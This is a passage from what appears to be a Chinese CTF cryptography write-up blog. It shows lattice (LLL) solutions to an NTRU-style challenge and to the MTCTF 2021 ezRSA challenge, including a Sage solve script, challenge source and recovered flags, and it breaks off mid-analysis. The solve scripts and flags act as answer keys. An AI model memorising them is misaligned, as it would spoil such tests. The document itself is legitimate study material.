displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>h</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd></mtr></mtable><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>g</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">f*h=k*p+g\\g=f*h-k*p\\构造格：L=(\begin{matrix}1 &amp; h\\0 &amp; p\end{matrix})\\(f,k)L=(f,g)\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord cjk_fallback">格</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mopen">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">h</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span><span class="mspace newline"></span></span></span></span></p><p>具体原理我也不会（哭</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><mi>r</mi><mo>∗</mo><msup><mi>f</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>g</mi><mo>+</mo><mi>m</mi><mo>∗</mo><mi>f</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>f</mi><mo>∗</mo><mi>c</mi><mo>=</mo><mi>r</mi><mo>∗</mo><mi>g</mi><mo>+</mo><mi>m</mi><mo>∗</mo><msup><mi>f</mi><mn>2</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>f</mi><mo>∗</mo><mi>c</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mo>∗</mo><msup><mi>f</mi><mn>2</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mi>f</mi><mo>∗</mo><mi>c</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>f</mi><mn>2</mn></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=r*f^{-1}*g+m*f\quad mod(p)\\f*c=r*g+m*f^2 \quad mod(p)\\f*c\quad mod(p)=m*f^2\quad mod(g)\\m=(f*c\quad mod(p))*(f^2)^{-1}\quad mod(g)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span></span></p><h2 id="exp-22"><a class="markdownIt-Anchor" href="#exp-22"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>h = <span class="hljs-number">3967900409518491437091166715380802161532841159072519563471354336400750930009970177101953304861954502146570721506995224520631716261108071684882841102381144720177664434981608584075201907891964214604246219441325377602163957172642582158192223452845671007585556951922415200415538060247456213608112360361636912703380306386439846269645696750929811607783895294670639202472465920599542568227657152922843001792754116981992696203788298740550812661583820191877594185184758074771316815650833195023325150218113883046328740408517222933980589974912467363367727038230703152354450353199257411964288022409128890352346036423792759938468964462267528727695183747947515480432786669353434638860350849296620606820894819933050645748656981993408399675189724419997805599649975500093890450393421897803267909569938850674774386012819838940544502656293639875120854745249463561940935651895728242282430164407574626178693654713011323376912585958110558532953333</span><br>p = <span class="hljs-number">4407206782832544188667944201727813617189883940490534227436068867901196311508151544316989531306678865408607390128649278629254128753967046691736522108356971272311308455619879297358588727267184200777923695048248757115057072357087881336680504033511958280710547178971268670442650871890760916203109226852889599638484429889898210426540567794020013920566784973281560628666918122674783539653720295629054898529900882965691587718212291373734218555167591690910246380516121338139063419587750344469214004539520017140593342859857394308703001939640899189432836134392830208318268131639318655382175643272565186884496188876341460968563623529229713790076050095498053846983536874648190033735162809614805624209827336432223553914651838063614534617044557310972056169869738746432924853953258079006936103497626054364115282007843847693813896856977882285910369660539092462408790126385881581833165309032853389777355480169212478669139225609058338565029211</span><br>c = <span class="hljs-number">4052491539376955553220568757544621659293304958837707160681090710624505862889512520190589879197831394720145909992216099963759496125523078969015706069688556356682711471641851937470179182960755800968587551608595725470945584970094036299764623894583379909329996337429067328575804567222496890803396234507278490116354758303807070775249711087938549824010697869930856205244006491475201993228121418890520174179969294094963249013786611889790711801269524919695653453576043288934196952437164829830756439734795068980207758771052483500272264363028346668629397497794792110170275173209377114274164087320163340547019935562316429227119346802124620682293405375798340275679831750482339301440428527223801872439611461272229275824994734898078664180541096159146759378804836952981089673755590353588900522455968721971944276318473421193690310601002295637581030417570868955379815661133148339565983621730401675643094909263098778572081973142223744746526672</span><br><br>L = matrix(ZZ, [[<span class="hljs-number">1</span>, h],[<span class="hljs-number">0</span>, p]])<br>v = L.LLL()[<span class="hljs-number">0</span>]<br>f, g = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">abs</span>, v)<br>m = ((f*c%p)*invert(f*f,g))%g<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;Sangfor&#123;pfa2s1f65ads4fwev1s2d3v1cxxavqes&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;pfa2s1f65ads4fwev1s2d3v1cxxavqes&#125;</span><br></code></pre></td></tr></table></figure><h1 id="mtctf-2021-finalezrsa"><a class="markdownIt-Anchor" href="#mtctf-2021-finalezrsa"></a> [MTCTF 2021 final]ezRSA</h1><h2 id="题目-23"><a class="markdownIt-Anchor" href="#题目-23"></a> 题目\</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>e = <span class="hljs-number">65537</span><br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br>s = getPrime(<span class="hljs-number">256</span>)<br>M = getPrime(<span class="hljs-number">5048</span>)<br>hint = (p - <span class="hljs-number">297498275426</span>) * inverse(s, M) % M<br>t = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;message.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>t.write(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>\nc = <span class="hljs-subst">&#123;c&#125;</span>\nn = <span class="hljs-subst">&#123;n&#125;</span>\nM = <span class="hljs-subst">&#123;M&#125;</span>\nhint = <span class="hljs-subst">&#123;hint&#125;</span>\n&quot;</span>)<br>t.close()<br><span class="hljs-string">&quot;&quot;&quot;e = 65537</span><br><span class="hljs-string">c = 11223534598141520071392544441952727165225232358333005778273904279807651365082135278999006409297342081157139972503703772556228315654837441044781410960887536342197257046095815516053582104516752168718754752274252871063410625756822861003235434929734796245933907621657696650609132419469456238860601166224944487116</span><br><span class="hljs-string">n = 99499509473364452726944770421623721217675378717234178828554602484867641740497277374806036356486848621495917213623425604565104435195783450029879177770305417469850119739921527698744700219067563802483159458398895082044997907953256062342593605652927874232404778144112740505724215742062859322375891810785229735653</span><br><span class="hljs-string">M = 28858066896535909755146975040720031655813099454455588895434479778600245612915775220883088811806723015938061791264869678085304248608125313205719043320256733514389739252845381708094678596099621503299764646358765107958130065721737938646850422959290465490270263553423913213684958592738500488797707239673645370968467090153285601432966586133693641854092761919184904521240074718850103356119966387029699913571443658384564840234765103070736676067458391659605655580766436276719610283460962533141261830775028138998594269732067550977245136631815804641115446066102981044849495663224005844657686979516481904043008222498344271373989609634617315702887646444506965035406154183377067490922195507071571055579654138590566650703038341939225657159668601565182939447340585110418258653618384852356058444795156595720943362884361136229430356254095673818462046182310826133487611183265532844700265640889105864909560170846171486510513240630480729194415061752698286990999064594811803482429976978688266632277914610443963726561921790718480343488391563503774868490108659902216386976683532579945706490286814310031310144410303859633785939399012605326754445715302492704458881700872467560968264583996658711892595658439058034434031646411995511168849724976850557976639662545139917517675296224197763447929417263845949813741362574641118781293171167041592771305352186419565096347024619027397784780864922205105185970180629777320680707022011697404359388540366320053501502698747763307336114482530784826238326983596966436776918503653153420281803168537703048371580451</span><br><span class="hljs-string">hint = 24302462761412867722556483860201357169283131384498485449193507018526006760633350601593235386242712333885826513399701577522498685938541691414316724804357523659514319083860507720945068584985970098437482386854188516742033184163273293005356970701527614010961471490166306765208284126815267752826036846338185010168551115391901008731195800723630612524215610302192763771954146943262822909368086155537366851998954401585888789660061750804720858175620022924944428882337005545535959410243692854073069775794945154943244522898330286785483043492678802461244624116832548150221211726044545331789932659966539042635768789637635754297830131948383991027466194455817875377950516103513735000718642093769229006510961952865719649517629939801014585849419818774317178973918720330390674833583065434312010539617630210110724391629534996688713945139529416075521015600392479980677759342058040778532467875961508475990300178277703011765698425360329342396347848373844031930655143343217447877587074485794273364964346235973542157189093330870952677683308479410235841331914353677363106473914986073397716367455628483060709281215783434084559550690248426391913205234184130354155776334292729262232484610747771114078013979494659835579574006801652858265173309736540235377076956677464263798132149783780830729103485354096234062135454873557941791812722418582207577124971978987895472250326100927372068822672582017222521124179752698654114839303426099426224351872025466618402675104161895600513776962289703455252021742990686505176582638132300246212598903123706906104217087</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="分析-23"><a class="markdownIt-Anchor" href="#分析-23"></a> 分析</h2><p>我们知道：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mi>a</mi><mo stretchy="false">)</mo><mo>∗</mo><msup><mi>s</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint=(p-a)*s^{-1}\quad mod(M)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span></span></p><p>将p-a当作一个整体</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo>∗</mo><mi>s</mi><mo>=</mo><mi>p</mi><mo>+</mo><mi>k</mi><mo>∗</mo><mi>M</mi><mspace linebreak="newline"></mspace><mi>p</mi><mo>=</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo>∗</mo><mi>s</mi><mo>+</mo><mi>k</mi><mo>∗</mo><mi>M</mi><mspace linebreak="newline"></mspace><mtext>构造格</mtext><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>M</mi></mstyle></mtd></mtr></mtable><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint*s=p+k*M\\p=hint*s+k*M\\构造格L=(\begin{matrix}1 &amp; hint\\0 &amp; M\end{matrix})\\(s,k)L=(s,p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">s</span><span class="mspace" 